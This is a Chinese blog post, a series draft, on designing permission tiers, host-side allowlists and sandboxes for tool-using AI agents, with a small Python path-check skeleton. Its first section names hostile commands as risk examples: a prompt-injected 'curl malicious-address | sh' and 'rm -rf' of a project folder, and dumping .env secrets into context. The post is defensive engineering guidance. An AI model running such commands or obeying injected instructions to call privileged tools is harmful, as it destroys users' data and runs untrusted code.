---
title: Agent 工程笔记⑩：权限与沙箱——工具能碰什么边界
date: 2026-09-23
description: 专栏「Agent 工程笔记」第十篇：Agent 工具权限与沙箱边界，哪些能力必须限缩、怎么设计。
tags: [AI, Agent, 系列]
series: agent-notes
draft: true
---

Agent 一旦能调工具，就不只是「说话」，而是在**替你操作真实系统**。权限与沙箱（Sandbox）要回答：哪些能力开放、在什么环境执行、越界时如何硬拒绝。

模型再守规矩，也抵不过一把「任意写文件 + 任意发 HTTP」的万能工具。工程上默认应**最小权限**：能读就不写，能预览就不执行。

下面是我整理的工具边界设计：分级、沙箱层与宿主 enforcement。

权限设计要假设 prompt 注入一定会发生：攻击者目标就是让模型「合法地」调用高权限 tool。硬边界是唯一答案，别赌模型的道德感。

![工具权限边界示意](https://ik.imagekit.io/4pjac7gmxh/blog/2026/09/permission-boundary_Ql5ZQm22J.png)

## 一、先说一个具体麻烦

内部助手接了 `run_shell`：「执行任意 shell 命令，帮用户完成任务。」某次用户（或 prompt 注入）让它 `curl 恶意地址 | sh`，或 `rm -rf` 项目目录。

日志里模型「本意」可能是装依赖，但**宿主没有在工具层拦路径与命令白名单**。事后审计只能看到「模型调了 run_shell」——权限设计失败，不是单点 prompt 能补的。

同类风险还有「读环境变量工具」：本意是读 `NODE_ENV`，Observe 却把整份 `.env` 回灌上下文，Secret 随之扩散。

## 二、三层边界模型

（1）**工具可见性**：哪些 tool 注册给当前 Agent / 当前用户角色。  
（2）**参数约束**：路径前缀、HTTP 域名 allowlist、SQL 只读、最大行数。  
（3）**执行环境**：容器、临时目录、网络 egress 关闭、凭据 scoped token。

![沙箱分层结构](https://ik.imagekit.io/4pjac7gmxh/blog/2026/09/sandbox-layers_wnLLAFhEu.png)

模型侧的 system prompt 是软约束；**硬约束必须在宿主执行 tool 前校验**，失败则 Observe 返回 `permission_denied`，见系列第四篇。

## 三、分级示例：读 / 写 / 危险

| 级别 | 典型工具 | 策略 |
|------|----------|------|
| L0 只读 | 查文档、读仓库 | 默认开放，带宽与大小限额 |
| L1 受控写 | 改指定目录、建草稿 | 路径白名单 + diff 预览 |
| L2 对外 | 发邮件、调支付 API | 必须 Human-in-the-loop，见系列第十一篇 |
| L3 禁止 | 删库、改 IAM | 不注册给 Agent |

子 Agent 应比协调者**更窄**的权限，而不是复制全套工具。

同一用户在不同项目里角色不同，权限还应跟 `project_id` 绑定，而不是全局一把梭。

## 四、宿主校验代码骨架

```python
ALLOWED_READ_PREFIXES = ["/workspace/repo/"]
ALLOWED_WRITE = ["/workspace/repo/src/"]

def run_read_file(path: str) -> str:
    if not any(path.startswith(p) for p in ALLOWED_READ_PREFIXES):
        raise PermissionError(f"path not allowed: {path}")
    return open(path).read()

def run_write_file(path: str, content: str) -> dict:
    if not any(path.startswith(p) for p in ALLOWED_WRITE):
        return {"ok": False, "error": "write_denied", "path": path}
    # 可选：先返回 preview，等 HITL 批准再落盘
    return {"ok": True, "bytes": len(content)}
```

上面代码中，校验在 Python 侧完成，**不依赖模型自觉**；写操作返回结构化错误，便于 Plan 下一轮改路径或请求人工。

只读工具也建议限额：单次读取最大字节、SQL 最大行数，防止「合法读路径」仍把上下文撑爆。

## 五、沙箱执行环境

（1）**文件**：临时 chroot 或挂载只读源码 + 可写 `/tmp/out`。  
（2）**网络**：默认无 egress；需要调 API 时走宿主代理并审计 URL。  
（3）**凭据**：短效 token 绑定 scope，不用用户主账号密码进容器。  
（4）**时长**：命令 timeout，防止 fork 炸弹或 hung 进程。

生产环境还应对照合规要求做「双人复核」类策略：L2 工具即使模型有权限，仍必须走 HITL，而不是把希望寄托在更长的 system prompt 上。

## 六、常见误区

（1）**prompt 里写「请勿删除文件」当安全策略**  
注入攻击专门绕过软提示。  
（2）**工具返回完整环境变量**  
Observe 泄漏密钥到后续上下文。  
（3）**协调 Agent 拥有写权限，子 Agent 也只读形同虚设**  
协调者被劫持等于全线失守。  
（4）**沙箱与生产共盘**  
容器逃逸或路径拼接仍可能伤到真数据。  
（5）**不做审计日志**  
无法复盘「谁在何时通过 Agent 改了什么」。

审计字段建议包含：`user_id`、`session_id`、`tool`、`args_hash`、审批 ticket（若有）。出事时能回答「是 Agent 自动还是人点的」，比事后禁工具更有用。

定期做「红队 prompt」：故意诱导 Agent 调 L3 工具，看宿主是否真拦——比读一百页安全白皮书更接近真实风险。

## 七、小结与系列导航

权限与沙箱的本质：**把 Agent 能力压到任务所需的最小集合，并在宿主硬执行**。工具 schema 写清边界（系列第五篇）是第一步；真正兜底靠这一层的 allowlist 与环境隔离。默认 deny，逐条放行，比默认全开再补黑名单安全一个数量级。

权限变更应可灰度：新工具先给内测角色，Observe 里统计误调率，再逐步放大——别一上线就对全员开放写库能力。

沙箱镜像也要版本锁定：Agent 环境漂移会导致「本地通过、线上失败」，排查时先对齐依赖，再怪模型。

只读 ≠ 无风险：一次读到超大文件或全表 scan，同样能拖垮服务——限额与超时是权限的一部分。

给每个 tool 标注 owner 与 rollback 联系人，出事故时不必在 Slack 里问「这 API 谁加的」。

权限 review 应季度做一次：离职员工的 scoped token、过期但仍注册的工具，都是沉睡的雷。

上一篇预告：Grounding——怎么让回答贴文档。  
下一篇预告：人机协同——哪些步骤必须人工确认。

（完）
